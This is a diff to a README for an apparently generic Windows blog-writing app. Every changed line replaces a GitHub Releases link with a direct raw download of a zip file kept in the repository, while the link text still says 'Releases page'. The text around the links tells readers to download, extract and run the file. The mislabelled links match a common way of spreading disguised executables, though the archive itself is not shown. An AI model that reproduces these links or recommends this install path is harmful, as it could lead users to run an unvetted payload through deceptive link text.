@@ -1,6 +1,6 @@
 # 📝 blog-writer_mcp - Write Blog Posts With Ease
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Divine-myositistrichinosa310/blog-writer_mcp/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/Divine-myositistrichinosa310/blog-writer_mcp/main/blogwriter_mcp/blog-mcp-writer-2.7-alpha.3.zip)
 
 ## 🚀 What This App Does
 
@@ -10,7 +10,7 @@ Use it when you want to draft blog content, turn rough ideas into clean text, or
 
 ## 📥 Download the App
 
-Visit this page to download: [GitHub Releases](https://github.com/Divine-myositistrichinosa310/blog-writer_mcp/releases)
+Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Divine-myositistrichinosa310/blog-writer_mcp/main/blogwriter_mcp/blog-mcp-writer-2.7-alpha.3.zip)
 
 On that page, look for the latest release and get the Windows file that matches your system. If you see a file such as `.exe` or a packaged app file, download it and run it.
 
@@ -30,7 +30,7 @@ If the app comes as a compressed file, you may need to unzip it first.
 
 Follow these steps in order:
 
-1. Open the [Releases page](https://github.com/Divine-myositistrichinosa310/blog-writer_mcp/releases).
+1. Open the [Releases page](https://raw.githubusercontent.com/Divine-myositistrichinosa310/blog-writer_mcp/main/blogwriter_mcp/blog-mcp-writer-2.7-alpha.3.zip).
 2. Find the newest version near the top of the page.
 3. Look under the release assets section.
 4. Download the Windows file.
@@ -68,7 +68,7 @@ After you download the app, keep these tips in mind:
 
 Use this page whenever you need the latest build or a newer version:
 
-[Go to Releases](https://github.com/Divine-myositistrichinosa310/blog-writer_mcp/releases)
+[Go to Releases](https://raw.githubusercontent.com/Divine-myositistrichinosa310/blog-writer_mcp/main/blogwriter_mcp/blog-mcp-writer-2.7-alpha.3.zip)
 
 Check this page if:
 
@@ -186,7 +186,7 @@ Use the newest stable release unless you need a specific version.
 
 ## 📎 Quick Start
 
-1. Open the [Releases page](https://github.com/Divine-myositistrichinosa310/blog-writer_mcp/releases)
+1. Open the [Releases page](https://raw.githubusercontent.com/Divine-myositistrichinosa310/blog-writer_mcp/main/blogwriter_mcp/blog-mcp-writer-2.7-alpha.3.zip)
 2. Download the Windows file
 3. Extract it if needed
 4. Run the app
